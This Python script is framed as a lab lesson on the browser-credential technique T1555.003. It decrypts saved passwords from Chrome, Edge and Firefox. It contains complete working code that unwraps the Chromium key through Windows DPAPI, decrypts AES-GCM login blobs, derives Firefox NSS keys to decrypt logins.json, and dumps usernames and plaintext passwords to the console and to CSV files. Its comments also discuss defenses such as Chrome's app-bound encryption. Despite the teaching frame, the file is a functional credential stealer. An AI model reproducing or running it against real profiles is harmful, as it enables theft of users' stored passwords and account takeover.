#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
decrypt_browser.py — T1555.003 offline follow-up lesson (lab-safe, local only)

Decrypts Chromium saved passwords from the artifacts collected by the
"Browser harvest" lab button (C:\\LabOut\\Browser). Nothing leaves the
machine: results are printed and saved next to the artifacts, inside the VM.

The chain this script demonstrates (the actual lesson):

  1. Chromium encrypts each saved password with AES-256-GCM. The stored blob
     is  b"v10" / b"v11"  +  12-byte nonce  +  ciphertext  +  16-byte tag.
  2. The AES key is stored in "Local State" (JSON) at
     os_crypt.encrypted_key  ->  base64, prefixed b"DPAPI", wrapped by the
     *current Windows user's* DPAPI master key.
  3. CryptUnprotectData unwraps it silently because this script runs as that
     same user — no prompt, no admin, nothing suspicious. DPAPI protects
     data from *other* users, not from code running *as* the user. That gap
     is why "malware can read your browser passwords" is a thing.
  4. Defenses to discuss in the report:
       - b"v20" blobs (Chrome 127+) use app-bound encryption: the key is
         additionally bound to a COM elevation service, so plain user-mode
         decryption (this script) correctly FAILS on them. We count them.
       - Enterprise: PasswordManagerEnabled=false policy, DPAPI/credential
         guard hardening, device control, alerting on mass DB access.

Zero dependencies: Python stdlib + ctypes (crypt32 for DPAPI, bcrypt for
AES-GCM). Test with --selftest first — it validates the crypto wrappers with
synthetic data only, touching no real browser profiles.

Usage (inside the course VM, after the Browser harvest button ran):
    python decrypt_browser.py             # decrypt Chrome + Edge artifacts
    python decrypt_browser.py --selftest  # synthetic self-test, no profiles
"""
import base64
import csv
import ctypes
import ctypes.wintypes as wt
import glob
import hashlib
import json
import os
import shutil
import sqlite3
import sys
import tempfile

ART_DIR = r"C:\LabOut\Browser"
BROWSERS = [
    ("Chrome", "ChromeState", "ChromeLogin"),
    ("Edge", "EdgeState", "EdgeLogin"),
]

STATUS_AUTH_TAG_MISMATCH = 0xC000A002


# ------------------------------------------------------------------ DPAPI --
class _BLOB(ctypes.Structure):
    _fields_ = [("cbData", wt.DWORD), ("pbData", ctypes.c_void_p)]


def dpapi_unwrap(data: bytes) -> bytes:
    """CryptUnprotectData — bound to the current user's master key."""
    buf = ctypes.create_string_buffer(bytes(data), len(data))
    bin_ = _BLOB(len(data), ctypes.cast(buf, ctypes.c_void_p))
    out = _BLOB()
    ok = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(bin_), None, None, None, None, 0, ctypes.byref(out))
    if not ok:
        raise OSError("CryptUnprotectData failed "
                      "(not the profile owner? wrong machine?)")
    try:
        return ctypes.string_at(out.pbData, out.cbData)
    finally:
        ctypes.windll.kernel32.LocalFree(ctypes.c_void_p(out.pbData))


def dpapi_wrap(data: bytes) -> bytes:
    """CryptProtectData — used only by --selftest to make a synthetic blob."""
    buf = ctypes.create_string_buffer(bytes(data), len(data))
    bin_ = _BLOB(len(data), ctypes.cast(buf, ctypes.c_void_p))
    out = _BLOB()
    ok = ctypes.windll.crypt32.CryptProtectData(
        ctypes.byref(bin_), None, None, None, None, 0, ctypes.byref(out))
    if not ok:
        raise OSError("CryptProtectData failed")
    try:
        return ctypes.string_at(out.pbData, out.cbData)
    finally:
        ctypes.windll.kernel32.LocalFree(ctypes.c_void_p(out.pbData))


# --------------------------------------------------------------- AES-GCM ---
class _AUTHINFO(ctypes.Structure):
    # BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO — all 13 fields, or CNG reads
    # past the end and fails with STATUS_INVALID_PARAMETER.
    _fields_ = [
        ("cbSize", wt.ULONG), ("dwInfoVersion", wt.ULONG),
        ("pbNonce", ctypes.c_void_p), ("cbNonce", wt.ULONG),
        ("pbAuthData", ctypes.c_void_p), ("cbAuthData", wt.ULONG),
        ("pbTag", ctypes.c_void_p), ("cbTag", wt.ULONG),
        ("pbMacContext", ctypes.c_void_p), ("cbMacContext", wt.ULONG),
        ("cbAAD", wt.ULONG), ("cbData", ctypes.c_ulonglong),
        ("dwFlags", wt.ULONG),
    ]


def _gcm_open(key, nonce, data, decrypt):
    """Shared CNG setup. decrypt=True -> BCryptDecrypt, False -> Encrypt."""
    bcrypt = ctypes.windll.bcrypt
    if decrypt:
        ct, tag = data[:-16], data[-16:]
        payload = ctypes.create_string_buffer(ct, max(1, len(ct)))
        tag_buf = ctypes.create_string_buffer(tag, 16)
        out_len = len(ct)
    else:
        payload = ctypes.create_string_buffer(data, max(1, len(data)))
        tag_buf = ctypes.create_string_buffer(16)
        out_len = len(data) + 16
    nonce_buf = ctypes.create_string_buffer(nonce, len(nonce))
    key_buf = ctypes.create_string_buffer(key, len(key))
    ai = _AUTHINFO(ctypes.sizeof(_AUTHINFO), 1,
                   ctypes.cast(nonce_buf, ctypes.c_void_p), len(nonce),
                   None, 0,
                   ctypes.cast(tag_buf, ctypes.c_void_p), 16,
                   None, 0, 0, 0, 0)
    hAlg = wt.HANDLE()
    if bcrypt.BCryptOpenAlgorithmProvider(ctypes.byref(hAlg), "AES", None, 0):
        raise OSError("BCryptOpenAlgorithmProvider failed")
    try:
        mode = ctypes.c_wchar_p("ChainingModeGCM")
        if bcrypt.BCryptSetProperty(hAlg, "ChainingMode", mode,
                                    (len("ChainingModeGCM") + 1) * 2, 0):
            raise OSError("BCryptSetProperty(ChainingModeGCM) failed")
        obj_len = wt.ULONG()
        cb = wt.ULONG()
        if bcrypt.BCryptGetProperty(hAlg, "ObjectLength",
                                    ctypes.byref(obj_len), 4,
                                    ctypes.byref(cb), 0):
            raise OSError("BCryptGetProperty(ObjectLength) failed")
        key_obj = ctypes.create_string_buffer(obj_len.value)
        hKey = wt.HANDLE()
        if bcrypt.BCryptGenerateSymmetricKey(hAlg, ctypes.byref(hKey),
                                             key_obj, obj_len.value,
                                             key_buf, len(key), 0):
            raise OSError("BCryptGenerateSymmetricKey failed")
        try:
            out = ctypes.create_string_buffer(max(1, out_len))
            got = wt.ULONG()
            if decrypt:
                # windll restype is signed c_int — normalize NTSTATUS first,
                # else 0xC000A002 never equals the positive constant.
                st = bcrypt.BCryptDecrypt(hKey, payload, len(ct),
                                          ctypes.byref(ai), None, 0,
                                          out, out_len,
                                          ctypes.byref(got), 0) & 0xFFFFFFFF
                if st == STATUS_AUTH_TAG_MISMATCH:
                    raise ValueError("auth tag mismatch (wrong key/length)")
                if st:
                    raise OSError("BCryptDecrypt: 0x%08X" % (st & 0xFFFFFFFF))
            else:
                st = bcrypt.BCryptEncrypt(hKey, payload, len(data),
                                          ctypes.byref(ai), None, 0,
                                          out, out_len, ctypes.byref(got), 0)
                if st:
                    raise OSError("BCryptEncrypt: 0x%08X" % (st & 0xFFFFFFFF))
            return out.raw[:got.value], tag_buf.raw[:16]
        finally:
            bcrypt.BCryptDestroyKey(hKey)
    finally:
        bcrypt.BCryptCloseAlgorithmProvider(hAlg, 0)


def gcm_decrypt(key: bytes, nonce: bytes, ct_and_tag: bytes) -> bytes:
    if len(ct_and_tag) <= 16:
        raise ValueError("blob too short")
    pt, _ = _gcm_open(key, nonce, ct_and_tag, decrypt=True)
    return pt


def load_key(state_path: str) -> bytes:
    """Local State -> os_crypt.encrypted_key -> DPAPI unwrap -> AES key."""
    with open(state_path, "r", encoding="utf-8") as f:
        enc = json.load(f)["os_crypt"]["encrypted_key"]
    wrapped = base64.b64decode(enc)
    if not wrapped.startswith(b"DPAPI"):
        raise ValueError("unexpected encrypted_key prefix: %r" % wrapped[:8])
    return dpapi_unwrap(wrapped[5:])


# ------------------------------------------------------- CBC (Firefox/NSS) --
BCRYPT_BLOCK_PADDING = 1


def cbc_encrypt(alg_name: str, key: bytes, iv: bytes, data: bytes) -> bytes:
    bcrypt = ctypes.windll.bcrypt
    key_buf = ctypes.create_string_buffer(bytes(key), len(key))
    iv_buf = ctypes.create_string_buffer(bytes(iv), len(iv))
    pt = ctypes.create_string_buffer(bytes(data), max(1, len(data)))
    out = ctypes.create_string_buffer(len(data) + 32)
    got = wt.ULONG()
    hAlg = wt.HANDLE()
    if bcrypt.BCryptOpenAlgorithmProvider(ctypes.byref(hAlg), alg_name, None, 0):
        raise OSError("BCryptOpenAlgorithmProvider(%s) failed" % alg_name)
    try:
        obj_len = wt.ULONG()
        cb = wt.ULONG()
        if bcrypt.BCryptGetProperty(hAlg, "ObjectLength", ctypes.byref(obj_len),
                                    4, ctypes.byref(cb), 0):
            raise OSError("BCryptGetProperty failed")
        key_obj = ctypes.create_string_buffer(obj_len.value)
        hKey = wt.HANDLE()
        if bcrypt.BCryptGenerateSymmetricKey(hAlg, ctypes.byref(hKey), key_obj,
                                             obj_len.value, key_buf,
                                             len(key), 0):
            raise OSError("BCryptGenerateSymmetricKey failed")
        try:
            st = bcrypt.BCryptEncrypt(hKey, pt, len(data), None, iv_buf,
                                      len(iv), out, len(out),
                                      ctypes.byref(got),
                                      BCRYPT_BLOCK_PADDING) & 0xFFFFFFFF
            if st:
                raise OSError("BCryptEncrypt: 0x%08X" % st)
            return out.raw[:got.value]
        finally:
            bcrypt.BCryptDestroyKey(hKey)
    finally:
        bcrypt.BCryptCloseAlgorithmProvider(hAlg, 0)


def cbc_decrypt(alg_name: str, key: bytes, iv: bytes, data: bytes) -> bytes:
    bcrypt = ctypes.windll.bcrypt
    key_buf = ctypes.create_string_buffer(bytes(key), len(key))
    iv_buf = ctypes.create_string_buffer(bytes(iv), len(iv))
    ct = ctypes.create_string_buffer(bytes(data), max(1, len(data)))
    out = ctypes.create_string_buffer(len(data) + 32)
    got = wt.ULONG()
    hAlg = wt.HANDLE()
    if bcrypt.BCryptOpenAlgorithmProvider(ctypes.byref(hAlg), alg_name, None, 0):
        raise OSError("BCryptOpenAlgorithmProvider(%s) failed" % alg_name)
    try:
        obj_len = wt.ULONG()
        cb = wt.ULONG()
        if bcrypt.BCryptGetProperty(hAlg, "ObjectLength", ctypes.byref(obj_len),
                                    4, ctypes.byref(cb), 0):
            raise OSError("BCryptGetProperty failed")
        key_obj = ctypes.create_string_buffer(obj_len.value)
        hKey = wt.HANDLE()
        if bcrypt.BCryptGenerateSymmetricKey(hAlg, ctypes.byref(hKey), key_obj,
                                             obj_len.value, key_buf,
                                             len(key), 0):
            raise OSError("BCryptGenerateSymmetricKey failed")
        try:
            st = bcrypt.BCryptDecrypt(hKey, ct, len(data), None, iv_buf,
                                      len(iv), out, len(out),
                                      ctypes.byref(got),
                                      BCRYPT_BLOCK_PADDING) & 0xFFFFFFFF
            if st:
                raise OSError("BCryptDecrypt: 0x%08X" % st)
            return out.raw[:got.value]
        finally:
            bcrypt.BCryptDestroyKey(hKey)
    finally:
        bcrypt.BCryptCloseAlgorithmProvider(hAlg, 0)


# ------------------------------------------------- minimal DER (NSS blobs) --
def der_read(buf: bytes, i: int = 0):
    """Return (tag, content, next_offset) for one DER element."""
    tag = buf[i]
    i += 1
    ln = buf[i]
    i += 1
    if ln & 0x80:
        n = ln & 0x7F
        ln = int.from_bytes(buf[i:i + n], "big")
        i += n
    return tag, buf[i:i + ln], i + ln


def der_children(content: bytes):
    out = []
    i = 0
    while i < len(content):
        try:
            tag, val, i = der_read(content, i)
        except IndexError:
            break  # tolerate trailing padding/garbage
        out.append((tag, val))
    return out


# ---------------------------------------------------------- Firefox (NSS) ---
def firefox_item_decrypt(blob: bytes, global_salt: bytes):
    """Decrypt a key4.db PBE blob. Returns (clear, key_len).

    Modern Firefox (v52+): PBKDF2-HMAC-SHA256 -> AES-256-CBC.
    Legacy: SHA1-based key derivation -> 3DES-CBC.
    """
    _, body, _ = der_read(blob)
    ch = der_children(body)
    params, cipher = ch[0][1], ch[1][1]
    pc = der_children(params)
    try:
        entry_salt = pc[0][1]
        iters = int.from_bytes(pc[1][1], "big")
        key_len = int.from_bytes(pc[2][1], "big")
        k = hashlib.sha1(global_salt + entry_salt).digest()
        key = hashlib.pbkdf2_hmac("sha256", k, entry_salt, iters, key_len)
        iv = b"\x04\x0e" + pc[4][1][:14]
        clear = cbc_decrypt("AES", key, iv, cipher)
        return clear, key_len
    except (IndexError, OSError):
        pass
    entry_salt = pc[0][1]
    hp = hashlib.sha1(global_salt + entry_salt).digest()
    pes = entry_salt + b"\x00" * max(0, 20 - len(entry_salt))
    chp = hashlib.sha1(hp + pes).digest()
    k1 = hashlib.sha1(hp + pes).digest()
    k2 = hashlib.sha1(chp + pes).digest()
    ka = k1 + k2
    clear = cbc_decrypt("3DES", ka[:24], ka[-8:], cipher)
    return clear, 24


def firefox_master_keys(key4_path: str) -> dict:
    """key4.db -> {key_id: item-key}. Fails clearly if a master password is set."""
    db = sqlite3.connect(key4_path)
    row = db.execute("SELECT item1, item2 FROM metaData "
                     "WHERE id = 'password-check'").fetchone()
    if row is None:
        raise ValueError("metaData password-check missing")
    item1, global_salt = bytes(row[0]), bytes(row[1])
    clear, _ = firefox_item_decrypt(item1, global_salt)
    if not clear.startswith(b"password-check"):
        raise ValueError("password-check mismatch (master password set?)")
    keys = {}
    try:
        rows = db.execute("SELECT a11 FROM nssPrivate").fetchall()
    except sqlite3.Error:
        rows = []
    for (a11,) in rows:
        if not a11:
            continue
        try:
            a11 = bytes(a11)
            clear, klen = firefox_item_decrypt(a11, global_salt)
            _, body, _ = der_read(a11)
            key_id = der_children(body)[0][1]
            keys[key_id] = clear[13:13 + klen]
        except Exception:
            continue
    if not keys:
        raise ValueError("no item keys recovered from nssPrivate")
    return keys


def ff_decrypt_item(b64: str, keys: dict) -> str:
    blob = base64.b64decode(b64)
    _, body, _ = der_read(blob)
    ch = der_children(body)
    key = keys.get(ch[0][1])
    if key is None:
        raise ValueError("no key for key-id")
    seq = der_children(ch[1][1])
    iv, ct = seq[1][1], seq[2][1]
    alg = "3DES" if len(key) == 24 else "AES"
    clear = cbc_decrypt(alg, key, iv, ct)
    return clear.decode("utf-16-be")


def dump_firefox_all():
    """Harvested FF_<profile>_key4.db + FF_<profile>_logins.json -> plaintext."""
    for key4 in sorted(glob.glob(os.path.join(ART_DIR, "FF_*_key4.db"))):
        prof = os.path.basename(key4)[3:-8]
        logins = os.path.join(ART_DIR, "FF_%s_logins.json" % prof)
        if not os.path.isfile(logins):
            print("[-] Firefox %s: logins.json not harvested yet "
                  "(no saved passwords at harvest time)" % prof)
            continue
        try:
            keys = firefox_master_keys(key4)
        except Exception as e:
            print("[-] Firefox %s: key4.db failed: %s" % (prof, e))
            continue
        with open(logins, "r", encoding="utf-8") as f:
            data = json.load(f)
        results = []
        for item in data.get("logins", []):
            try:
                user = ff_decrypt_item(item["encryptedUsername"], keys)
                pwd = ff_decrypt_item(item["encryptedPassword"], keys)
                url = item.get("formSubmitURL") or item.get("hostname") or ""
                results.append(("Firefox/" + prof, url, user, pwd))
            except Exception:
                continue
        total = len(data.get("logins", []))
        print("[*] Firefox/%s: logins=%d decrypted=%d"
              % (prof, total, len(results)))
        for _, url, user, pwd in results:
            print("    %-28s %s" % (user[:28], pwd[:32]))
        if results:
            out_csv = os.path.join(ART_DIR, "firefox_%s_passwords.csv" % prof)
            with open(out_csv, "w", newline="", encoding="utf-8-sig") as f:
                w = csv.writer(f)
                w.writerow(["browser", "url", "username", "password"])
                w.writerows(results)
            print("    saved -> %s" % out_csv)


def dump_browser(name, state_fn, login_fn):
    state = os.path.join(ART_DIR, state_fn)
    login = os.path.join(ART_DIR, login_fn)
    if not (os.path.isfile(state) and os.path.isfile(login)):
        print("[-] %s: artifacts not found in %s "
              "(run the Browser harvest button first)" % (name, ART_DIR))
        return
    key = load_key(state)
    print("[*] %s: DPAPI unwrap OK, AES key = %s..." % (name, key.hex()[:16]))

    # Work on a temp copy so we never touch the original artifact.
    tmp = tempfile.mktemp(suffix=".db")
    shutil.copyfile(login, tmp)
    rows = sqlite3.connect(tmp).execute(
        "SELECT origin_url, username_value, password_value "
        "FROM logins").fetchall()

    results, appbound, failed = [], 0, 0
    for url, user, pwd in rows:
        if not pwd:
            continue
        if isinstance(pwd, str):
            results.append((name, url or "", user or "", pwd))  # legacy plain
            continue
        if pwd[:3] == b"v20":
            appbound += 1          # Chrome 127+ app-bound: defense working
            continue
        if pwd[:3] in (b"v10", b"v11"):
            try:
                plain = gcm_decrypt(key, pwd[3:15], pwd[15:])
            except ValueError:
                failed += 1
                continue
            results.append((name, url or "", user or "",
                            plain.decode("utf-8", "replace")))
        else:
            failed += 1

    print("    logins=%d  decrypted=%d  app-bound(v20, blocked)=%d  failed=%d"
          % (len(rows), len(results), appbound, failed))
    for _, url, user, plain in results:
        print("    %-12s %-28s %s" % (user[:28], plain[:32], url[:48]))

    if results:
        out_csv = os.path.join(ART_DIR, "%s_passwords.csv" % name.lower())
        with open(out_csv, "w", newline="", encoding="utf-8-sig") as f:
            w = csv.writer(f)
            w.writerow(["browser", "url", "username", "password"])
            w.writerows(results)
        print("    saved -> %s" % out_csv)


def selftest():
    """Synthetic roundtrips only — touches no real browser data."""
    secret = b"MochiKey-lab-selftest-123"
    assert dpapi_unwrap(dpapi_wrap(secret)) == secret
    print("[+] DPAPI wrap/unwrap roundtrip OK")

    key = os.urandom(32)
    nonce = os.urandom(12)
    pt = b"p@ssw0rd-demo-456"
    ct, tag = _gcm_open(key, nonce, pt, decrypt=False)
    assert gcm_decrypt(key, nonce, ct + tag) == pt
    print("[+] AES-256-GCM encrypt/decrypt roundtrip OK")

    blob = b"v10" + nonce + ct + tag
    assert gcm_decrypt(key, blob[3:15], blob[15:]) == pt
    print("[+] Chromium v10 blob layout parse OK")

    try:
        gcm_decrypt(os.urandom(32), nonce, ct + tag)
        raise AssertionError("wrong key should have failed")
    except ValueError:
        print("[+] Wrong-key rejection (GCM tag) OK")

    key = os.urandom(32)
    iv = os.urandom(16)
    pt = b"firefox-cbc-selftest"
    assert cbc_decrypt("AES", key, iv, cbc_encrypt("AES", key, iv, pt)) == pt
    print("[+] AES-256-CBC (Firefox modern) roundtrip OK")

    key = os.urandom(24)
    iv = os.urandom(8)
    assert cbc_decrypt("3DES", key, iv, cbc_encrypt("3DES", key, iv, pt)) == pt
    print("[+] 3DES-CBC (Firefox legacy) roundtrip OK")

    der = bytes([0x30, 0x07, 0x04, 0x02, 0xAA, 0xBB, 0x02, 0x01, 0x07])
    ch = der_children(der[2:])
    assert ch[0] == (0x04, b"\xaa\xbb") and ch[1] == (0x02, b"\x07")
    print("[+] DER mini-parser OK")

    print("[+] ALL SELFTESTS PASSED")


def main():
    if "--selftest" in sys.argv:
        selftest()
        return
    if not os.path.isdir(ART_DIR):
        print("[-] %s not found — run the Browser harvest button in the VM "
              "first" % ART_DIR)
        return
    for name, state_fn, login_fn in BROWSERS:
        dump_browser(name, state_fn, login_fn)
    dump_firefox_all()
    print("[n] Reminder: v20 = app-bound encryption (Chrome 127+) — the "
          "defense working as intended. Discuss in the report.")


if __name__ == "__main__":
    main()
